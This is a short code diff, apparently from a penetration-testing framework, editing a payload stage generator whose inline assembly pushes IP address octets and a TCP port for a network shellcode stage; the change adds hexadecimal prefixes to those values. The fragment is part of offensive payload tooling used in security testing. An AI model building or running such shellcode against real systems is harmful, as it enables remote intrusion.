@@ -84,10 +84,10 @@ def generate_stage(opts={})
         push ebx
         push ebx
 
-        push #{fourth}
-        push #{third}
-        push #{second}
-        push #{first}
+        push 0x#{fourth}
+        push 0x#{third}
+        push 0x#{second}
+        push 0x#{first}
 
         push ebx
         push.i16 0x#{tcp_port}
